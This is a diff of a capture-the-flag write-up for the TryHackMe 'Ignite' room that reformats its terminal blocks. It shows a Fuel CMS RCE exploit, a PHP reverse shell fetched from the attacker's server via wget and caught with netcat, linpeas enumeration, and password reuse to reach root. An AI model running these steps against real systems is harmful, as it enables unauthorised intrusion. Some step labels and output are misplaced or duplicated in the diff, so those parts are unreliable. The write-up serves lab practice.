@@ -26,8 +26,7 @@ Time to light it up with the Ignite room.
 
 Give nmap a run to find those services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/ignite]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.220.6    
 [sudo] password for kali: 
@@ -64,21 +63,24 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 38.67 seconds
-```
-{% endraw %}
+1   7.70 ms   10.4.0.1
+2   ... 3
+4   261.69 ms 10.10.220.6
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.67 seconds
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check the robots.txt file.  Check to see if there is anything interesting.
 
-{% raw %}
-```html
-http://10.10.220.6/robots.txt
-
+{% capture t_browser %}
 User-agent: *
 Disallow: /fuel/
 #
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='http://10.10.220.6/robots.txt' content=t_browser %}
 
 <br />
 Check the /simple directory that is running on the webserver.
@@ -101,8 +103,7 @@ Check the /fuel directory that was mentioned in the robots.txt file.
 <br />
 Searchsploit for the the fuel cms.
 
-{% raw %}
-```bash
+{% capture searchsploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/ignite]
 └─$ searchsploit fuel cms
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -117,8 +118,8 @@ Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                
 Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                                                                                                                                        | php/webapps/50884.txt
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=searchsploit %}
 
 <br />
 Look-up the credentials for the Fuel CMS.
@@ -142,18 +143,16 @@ Test the credentials and login.
 <br />
 Copy the exploit into the local working folder.
 
-{% raw %}
-```bash
+{% capture cpexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/ignite]
-└─$ cp $(locate 50477.py) .   
-```
-{% endraw %}
+└─$ cp $(locate 50477.py) .
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cpexploit %}
 
 <br />
 Run the exploit and gain command execution.
 
-{% raw %}
-```bash
+{% capture testlsexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/ignite]
 └─$ python3 50477.py -u http://10.10.220.6
 [+]Connecting...
@@ -164,27 +163,14 @@ composer.json
 contributing.md
 fuel
 index.php
-robots.txt 
-```
-{% endraw %}
+robots.txt
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=testlsexploit %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
-┌──(kali㉿kali)-[~/Documents/thm/madness]
-└─$ sudo nc -nlvp 443                               
-[sudo] password for kali: 
-listening on [any] 443 ... 
-```
-{% endraw %}
-
-<br />
-Download Pentest Monkey PHP reverse shell.
-
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/madness]
 └─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
 --2025-01-14 23:26:52--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -197,14 +183,16 @@ Saving to: ‘shell.php’
 shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      
 
 2025-01-14 23:26:52 (56.0 MB/s) - ‘shell.php’ saved [5491/5491] 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
+
+<br />
+Download Pentest Monkey PHP reverse shell.
 
 <br />
 Update the IP and port in the script for your particular attack machine.
 
-{% raw %}
-```php
+{% capture pentestmonkey %}
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -230,49 +218,45 @@ $debug = 0;
 <snip>
 
 ?>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='shell.php' content=pentestmonkey %}
 
 <br />
 Start a python webserver.
 
-{% raw %}
-```bash
+{% capture pyserver %}
 ┌──(kali㉿kali)-[~/Documents/thm/madness]
 └─$ python -m 'http.server'                         
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pyserver %}
 
 <br />
 Use the RCE to transfer the shell to the web root directory.
 
-{% raw %}
-```bash
+{% capture tansfershell %}
 Enter Command $pwd
 system/var/www/html
 
 
 Enter Command $wget http://10.4.119.29:8000/shell.php -O shell.php
 system
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=tansfershell %}
 
 <br />
 Navigate to the webpage to trigger the payload.
 
-{% raw %}
-```bash
+{% capture curlshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/ignite]
 └─$ curl http://10.10.52.234/shell.php
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curlshell %}
 
 <br />
 Check the webpage and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/madness]
 └─$ sudo nc -nlvp 443                               
 [sudo] password for kali: 
@@ -285,14 +269,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 www-data@ubuntu:/$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 www-data@ubuntu:/home/www-data$ cat flag.txt
 cat flag.txt
 <redacted> 
@@ -315,14 +298,13 @@ lo        Link encap:Local Loopback
           TX packets:180 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1000 
           RX bytes:13916 (13.9 KB)  TX bytes:13916 (13.9 KB)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Download the linpeas enumeration script.
 
-{% raw %}
-```bash
+{% capture downloadlinpeas %}
 ┌──(kali㉿kali)-[~/Documents/thm/ignite]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh                                   
 --2025-01-14 23:39:57--  https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh
@@ -340,14 +322,13 @@ Saving to: ‘linpeas.sh’
 linpeas.sh                                                 100%[========================================================================================================================================>] 810.96K  2.13MB/s    in 0.4s    
 
 2025-01-14 23:40:00 (2.13 MB/s) - ‘linpeas.sh’ saved [830426/830426]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadlinpeas %}
 
 <br />
 Transfer the peas to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferlinpeas %}
 www-data@ubuntu:/home/www-data$ wget http://10.4.119.29:8000/linpeas.sh
 wget http://10.4.119.29:8000/linpeas.sh
 --2025-01-14 04:41:04--  http://10.4.119.29:8000/linpeas.sh
@@ -362,14 +343,13 @@ linpeas.sh          100%[===================>] 810.96K   330KB/s    in 2.5s
 
 www-data@ubuntu:/home/www-data$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferlinpeas %}
 
 <br />
 Run the linpeas and notice the password in the database.php file.
 
-{% raw %}
-```bash
+{% capture runlinpeas %}
 www-data@ubuntu:/home/www-data$ ./linpeas.sh
 ./linpeas.sh
 
@@ -406,14 +386,13 @@ www-data@ubuntu:/home/www-data$ ./linpeas.sh
 /var/www/html/fuel/application/config/database.php:     'password' => 'mememe',
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runlinpeas %}
 
 <br />
 Check the database.php file directly.
 
-{% raw %}
-```php
+{% capture databasephp %}
 <?php
 defined('BASEPATH') OR exit('No direct script access allowed');
 
@@ -426,14 +405,13 @@ $db['default'] = array(
         'password' => 'mememe',
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='database.php' content=databasephp %}
 
 <br />
 Use the password from the file to su into the root account.
 
-{% raw %}
-```bash
+{% capture suroot %}
 www-data@ubuntu:/dev/shm$ su
 su
 Password: mememe
@@ -441,14 +419,13 @@ Password: mememe
 root@ubuntu:/dev/shm# whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=suroot %}
 
 <br />
 Get the root.txt file.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@ubuntu:/dev/shm# cat /root/root.txt
 cat /root/root.txt                                                                                                                                                                                                                          
 <redacted>                                                                                                                                                                                                         
@@ -466,8 +443,8 @@ ip a
        valid_lft forever preferred_lft forever                                                                                                                                                                                              
     inet6 fe80::6f:9aff:fe41:260b/64 scope link                                                                                                                                                                                             
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Another room/box torched!  Hopefully you enjoyed the write-up.  See you in the next one.
